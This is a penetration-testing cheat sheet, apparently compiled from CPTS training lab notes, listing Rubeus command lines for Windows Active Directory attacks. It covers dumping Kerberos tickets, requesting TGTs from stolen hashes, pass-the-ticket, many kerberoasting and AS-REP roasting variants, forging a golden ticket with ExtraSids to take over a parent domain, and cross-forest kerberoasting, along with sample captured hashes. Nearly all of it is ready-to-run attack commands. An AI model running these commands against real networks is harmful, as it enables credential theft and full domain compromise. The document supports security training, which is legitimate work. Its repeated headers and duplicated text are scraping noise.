# Rubeus

% rubeus, kerberos, cpts

## Rubeus - Rubeus - Rubeus - Rubeus - harvesting-kerberos-tickets-from-windows
#cat/ATTACK #cpts
The result is a list of files with the extension .kirbi, which contain the tickets. Or with Rubeus

```
Rubeus.exe dump /nowrap
```

## Rubeus - Rubeus - Rubeus - Rubeus - rubeus
#cat/ATTACK #cpts
Ask TGT

```
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

## Rubeus - Rubeus - Rubeus - Rubeus - rubeus-2
#cat/ATTACK #cpts
PassTheHash

```
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

## Rubeus - Rubeus - Rubeus - Rubeus - rubeus-3
#cat/ATTACK #cpts
We can also use the Base64 output from Rubeus or convert a .kirbi to Base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to Base64.

```
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

## Rubeus - Rubeus - Rubeus - Rubeus - rubeus-4
#cat/ATTACK #cpts
PassTheHash - b64

```
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/...SNIP...
```

## Rubeus - Rubeus - Rubeus - Rubeus - rubeus---powershell-remoting-with-pass-the-ticket
#cat/ATTACK #cpts
Rubeus has the option createnetonly, which creates a sacrificial process/logon session (Logon type 9). The process is hidden by default, but we can specify the flag /show to display the process, and the result is the equ

```
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

## Rubeus - Rubeus - Rubeus - Rubeus - rubeus---powershell-remoting-with-pass-the-ticket-2
#cat/ATTACK #cpts
Rubeus has the option createnetonly, which creates a sacrificial process/logon session (Logon type 9). The process is hidden by default, but we can specify the flag /show to display the process, and the result is the equ

```
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

## Rubeus - Rubeus - Rubeus - Rubeus - rubeus---powershell-remoting-with-pass-the-ticket-3
#cat/ATTACK #cpts
Rubeus has the option createnetonly, which creates a sacrificial process/logon session (Logon type 9). The process is hidden by default, but we can specify the flag /show to display the process, and the result is the equ

```
Rubeus.exe ptt /ticket:\<ticket_b64>
```

## Rubeus - Rubeus - Rubeus - Rubeus - miscellaneous
#cat/ATTACK #cpts
We can do the reverse operation by first selecting a .kirbi file. Let's use the .kirbi file in Windows.

```
Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

## Rubeus - Rubeus - Rubeus - Rubeus - using-rubeus
#cat/ATTACK #cpts
```
Rubeus.exe kerberoast [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]
```

## Rubeus - Rubeus - Rubeus - Rubeus - using-rubeus-2
#cat/ATTACK #cpts
```
Rubeus.exe kerberoast /outfile:hashes.txt [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps]
```

## Rubeus - Rubeus - Rubeus - Rubeus - using-rubeus-3
#cat/ATTACK #cpts
```
Rubeus.exe kerberoast /simple [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]
```

## Rubeus - Rubeus - Rubeus - Rubeus - using-rubeus-4
#cat/ATTACK #cpts
```
Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]
```

## Rubeus - Rubeus - Rubeus - Rubeus - using-rubeus-5
#cat/ATTACK #cpts
```
Rubeus.exe kerberoast [/nowrap]
```

## Rubeus - Rubeus - Rubeus - Rubeus - using-rubeus-6
#cat/ATTACK #cpts
```
Rubeus.exe kerberoast /enterprise [/nowrap]
```

## Rubeus - Rubeus - Rubeus - Rubeus - using-rubeus-7
#cat/ATTACK #cpts
```
Rubeus.exe kerberoast /autoenterprise [/ldaps] [/nowrap]
```

## Rubeus - Rubeus - Rubeus - Rubeus - using-rubeus-8
#cat/ATTACK #cpts
```
Rubeus.exe kerberoast /usetgtdeleg [/ldaps] [/nowrap]
```

## Rubeus - Rubeus - Rubeus - Rubeus - using-rubeus-9
#cat/ATTACK #cpts
```
Rubeus.exe kerberoast /rc4opsec [/ldaps] [/nowrap]
```

## Rubeus - Rubeus - Rubeus - Rubeus - using-rubeus-10
#cat/ATTACK #cpts
```
Rubeus.exe kerberoast /stats [/ldaps] [/nowrap]
```

## Rubeus - Rubeus - Rubeus - Rubeus - using-rubeus-11
#cat/ATTACK #cpts
```
Rubeus.exe kerberoast /ldapfilter:'admincount=1' [/ldaps] [/nowrap]
```

## Rubeus - Rubeus - Rubeus - Rubeus - using-rubeus-12
#cat/ATTACK #cpts
```
Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/ldaps] [/nowrap]
```

## Rubeus - Rubeus - Rubeus - Rubeus - using-rubeus-13
#cat/ATTACK #cpts
```
Rubeus.exe kerberoast /delay:5000 /jitter:30 [/ldaps] [/nowrap]
```

## Rubeus - Rubeus - Rubeus - Rubeus - using-rubeus-14
#cat/ATTACK #cpts
```
Rubeus.exe kerberoast /aes [/ldaps] [/nowrap]
```

## Rubeus - Rubeus - Rubeus - Rubeus - using-the-stats-flag
#cat/ATTACK #cpts
```
(_____ \
```

## Rubeus - Rubeus - Rubeus - Rubeus - retrieving-as-rep-in-proper-format-using-rubeus
#cat/ATTACK #cpts
Miscellaneous Misconfigurations

```
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:D18650F4F4E0537E0188A6897A478C55$0978822DEC13046712DB7DC03F6C4DE059A946485451AAE98BB93DFF8E3E64F3AA5614160F21A029C2B9437CB16E5E9DA4A2870FEC0596B09BADA989D1F8057262EA40840E8D0F20313B4E9A40FA5E4F987FF404313227A7BFFAE748E07201369D48ABB4727DFE1A9F09D50D7EE3AA5C13E4433E0F9217533EE0E74B02EB8907E13A208340728F794ED5103CB3E5C7915BF2F449AFDA41988FF48A356BF2BE680A25931A8746A99AD3E757BFE097B852F72CEAE1B74720C011CFF7EC94CBB6456982F14DA17213B3B27DFA1AD4C7B5C7120DB0D70763549E5144F1F5EE2AC71DDFC4DCA9D25D39737DC83B6BC60E0A0054FC0FD2B2B48B25C6CA
```

## Rubeus - Rubeus - Rubeus - Rubeus - using-ls-to-confirm-no-access-before-running-rubeus
#cat/ATTACK #cpts
Attacking Domain Trusts - Child -> Parent Trusts - from Windows

```
ls : Access is denied
```

## Rubeus - Rubeus - Rubeus - Rubeus - crack-the-password-for-this-account-and-submit-it-as-your-answer
#cat/ATTACK #cpts
Students then need to use `Rubeus` to perform a `Kerbroasting` attack:

```
.\Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap
```

## Rubeus - Rubeus - Rubeus - Rubeus - work-through-the-examples-in-this-section-to-gain-a-better-understandi
#cat/ATTACK #cpts
Subsequently, students need to `Kerbroast` the `adunn` account:

```
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

## Rubeus - Rubeus - Rubeus - Rubeus - find-another-user-with-the-do-not-require-kerberos-pre-authentication-
#cat/ATTACK #cpts
Students need to use `Rubeus` to perform `AS-REP roasting` against the user `ygroce`:

```
.\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat
```

## Rubeus - Rubeus - Rubeus - Rubeus - find-another-user-with-the-do-not-require-kerberos-pre-authentication--2
#cat/ATTACK #cpts
```
$krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:E3B8FCAB0E3905D4678B190116218DCA$F297B10A7C0E3FF100FB35E758FE164DE662539937C77F197DFDA15884F4095DB9E5BB7AFE3C8F2D49D72EC53BCCF0B48D02BB7A51A99142BE23372910F99BE6ECF2C6227ED0E31A9AD4DB28B395CF8EA90DD1B3F87324227872AF5DCB2E4CD5527B006DDA4A2434877094505494B286260CCB3DA4E085E6F7C57FB07EC223922DA0591DB76B4ED30BADFB39CBF7B1F1EBA5267B633FAD71BA2CDF252BBA41EA7B602FCA3D860FDFEA639695F7A4F09B79EA08D225F37DB67F857180B096E0E00DFD240FE8D01E67E40C8DD2E05DED3E164C84DEF8134188E7597F86D9EA1E9CC48FDA29C2F0853453904EF8A7A7D940B2D8201DA101FE50B2CC
```

## Rubeus - Rubeus - Rubeus - Rubeus - perform-the-extrasids-attack-to-compromise-the-parent-domain-submit-th
#cat/ATTACK #cpts
Using the same `xfreerdp` connection established in question 1 of this section, students first need to use `Rubeus`:

```
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

## Rubeus - Rubeus - Rubeus - Rubeus - perform-a-cross-forest-kerberoast-attack-and-obtain-the-tgs-for-the-ms
#cat/ATTACK #cpts
Students then need to run `Rubeus` to perform a cross-forest `Kerberoast` attack:

```
.\Rubeus.exe kerberoast /domain:freightlogistics.local /user:mssqlsvc /nowrap
```

